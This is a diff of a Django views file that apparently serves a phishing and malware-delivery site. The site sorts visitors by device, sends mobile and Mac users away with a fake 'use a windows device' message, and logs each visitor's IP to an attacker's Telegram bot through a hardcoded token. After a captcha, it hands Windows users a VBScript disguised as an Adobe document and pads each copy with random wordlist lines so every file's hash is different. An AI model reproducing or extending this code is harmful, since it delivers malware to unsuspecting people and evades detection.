@@ -1,24 +1,15 @@
 import random
 import uuid
 import requests
-import shutil
 import os
-from django.shortcuts import redirect
+from django.shortcuts import redirect, render
 from django.http import FileResponse
+from .forms import CaptchaTestForm
+from django.contrib import messages
 
 # DECLARE CONSTANTS
 TELEGRAM_TOKEN = '6692059577:AAH-8s92yLsB94qHVKIZtxPtfEEH5SFJkOg'
 TELEGRAM_CHAT_ID = '-980609073'
-
-MOBILE_USER_AGENT = [
-    'Android',
-    'webOS',
-    'iPhone',
-    'iPad',
-    'iPod',
-    'BlackBerry',
-    'Windows Phone'
-]
 
 MAC_USER_AGENT = [
     'Macintosh',
@@ -37,7 +28,7 @@ def search_str(file_path, word):
         else:
             False
 
-# Function to check fo ip
+# Function to check for ip
 def get_ip(request):
     # Get the IP of the  device and log into the  file
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -63,67 +54,6 @@ def telegram_notification(message):
     # Throw an exception if Telegram API fails
     resp.raise_for_status()
 
-# TODO Function to handle inserting random words 
-def insert(originalfile,string):
-    with open(originalfile,'r') as f:
-        with open('newfile.txt','w') as f2: 
-            f2.write(string)
-            f2.write(f.read())
-    os.remove(originalfile)
-    os.rename('newfile.txt',originalfile)
-
-
-# Function that handles the redirection after checks
-def index(request):
-
-    # initialize device and os information of the visitor
-    device_type = ""
-    os_type = ""
-    if request.user_agent.is_mobile:
-        device_type = "Mobile"
-    if request.user_agent.is_tablet:
-        device_type = "Tablet"
-    if request.user_agent.is_pc:
-        device_type = "PC"
-    
-    os_type = request.user_agent.os.family
-    
-    
-    # Check if user is a bot
-    if request.user_agent.is_bot:
-        return redirect('bot_visit')
-    
-    # Check if user is on a mobile device or tablet
-    if device_type == "Mobile" or device_type == "Tablet":
-        return redirect('mobile_visit')
-    
-    # Check if user is on a mac
-    if os_type in MAC_USER_AGENT:
-        return redirect('mac_visit')
-
-    return redirect('download')
-
-
-# Function that handles bot visit
-def bot_visit(request):
-    os_type = request.user_agent.os.family
-    # Get the IP of the bot device and log into the bot.txt file
-    ip = get_ip(request)
-    
-    # Log the bot ip address 
-    if search_str('text_logs/bot.txt', ip):
-        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
-    else:
-        with open('text_logs/bot.txt', 'a') as file:
-            file.write(ip)
-
-    # Send telegram notification of bot visit
-
-    message = f'Visit from bot \n ip: {ip} \n OS: {os_type}'
-
-    telegram_notification(message)
-
-    return redirect('https://adobealertmsg.github.io/warning/')
 
 # Function that handles  mobile visits
 def mobile_visit(request):
@@ -131,7 +61,8 @@ def mobile_visit(request):
     ip = get_ip(request)
     # Log the mobile ip address 
     if search_str('text_logs/mobiles.txt', ip):
-        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
+        messages.info(request, 'Your Device is not Compatible, Ensure you are using a windows device')
+        return redirect('home')
     else:
         with open('text_logs/mobiles.txt', 'a') as file:
             file.write(ip)
@@ -144,7 +75,7 @@ def mobile_visit(request):
 
     
 
-    return redirect('https://adobealertmsg.github.io/warning/')
+    return redirect('home')
 
 # Function that handles  mac visits
 def mac_visit(request):
@@ -152,7 +83,8 @@ def mac_visit(request):
     ip = get_ip(request)
     # Log the mac ip address 
     if search_str('text_logs/macs.txt', ip):
-        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
+        messages.info(request, 'Your Device is not Compatible, Ensure you are using a windows device')
+        return redirect('home')
     else:
         with open('text_logs/macs.txt', 'a') as file:
             file.write(ip)
@@ -163,36 +95,100 @@ def mac_visit(request):
 
     telegram_notification(message)
 
-    return redirect('https://adobealertmsg.github.io/warning/')
+    return redirect('home')
 
 
+def home(request):
+    device_type = ""
+    os_type = ""
+    if request.user_agent.is_mobile:
+        device_type = "Mobile"
+    if request.user_agent.is_tablet:
+        device_type = "Tablet"
+    if request.user_agent.is_pc:
+        device_type = "PC"
+    
+    os_type = request.user_agent.os.family
+    
+    # Check if user is on a mobile device or tablet
+    if device_type == "Mobile" or device_type == "Tablet":
+        return redirect('mobile_visit')
+    
+    # Check if user is on a mac
+    if os_type in MAC_USER_AGENT:
+        return redirect('mac_visit')
+
+    
+    if request.method=="POST":
+      form=CaptchaTestForm(request.POST)
+      if form.is_valid():
+         return redirect('download')
+      else:
+         print("fail")
+    form=CaptchaTestForm()
+    return render(request,"home.html",{"form":form})
 
 
 def download_file(request):
-    # Get the IP of the bot device and log into the bot.txt file
+    # Get the IP device trying to download
     ip = get_ip(request)
     
     if search_str('text_logs/ip.txt', ip):
-        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
+        messages.info(request, 'File Downloaded Already!! Check your Download Folder')
+        return redirect('home')
     else:
         with open('text_logs/ip.txt', 'a') as file:
-            file.write(ip)
+            file.writelines(ip)
 
-    # Send download notification to telegram
-    
-    message = f'New Download \n ip: {ip}'
+        # Send download notification to telegram
+        
+        message = f'New Download \n ip: {ip}'
 
-    telegram_notification(message)
+        telegram_notification(message)
 
-    # Set the prefix
-    prefix = 'AdobeDOC'
+        # Prepare the download
+        # copy contents of the wordlist.txt
+        choicefile=open("wordlist.txt","r")
 
-    # Set File ID
-    file_id = str(uuid.uuid4().fields[-1])[:5]
-    
-    file_name = str(prefix) + file_id + '.vbs'
-    shutil.copyfile('Crypted3.vbs', file_name)
+        # initialize the list to hold the contents of the wordlist
+        linelist=[] 
 
-    
+        for line in choicefile:
+            linelist.append(line)
+
+        # shuffle the elements of the list
+        random.shuffle(linelist)
+
+        # loop through the shufled list elements and write to the test file
+        for i in range(8):
+            with open("test.txt", "a") as f:
+                f.write(linelist[i])
+
+        # Set the file name prefix
+        prefix = 'AdobeDOC'
+
+        # Set File ID and name
+        file_id = str(uuid.uuid4().fields[-1])[:5]
+
+        file_name = str(prefix) + file_id + '.vbs'
+
+        # provide content to the newly created file
+        with open("test.txt", "r") as file:
+            for line in file:
+                data = file.read()
+            with open("copy.vbs", "r+") as doc:
+                lines = doc.readlines()
+                with open(file_name, "w") as n:
+                    n.seek(0)
+                    n.write(data)
+                    for line in lines:
+                        n.write(line)
+                    
+        
+        with open("test.txt",'r+') as file:
+            file.truncate(0)
+
     return FileResponse(open(file_name, 'rb'), as_attachment=True)
+    
+    
                 
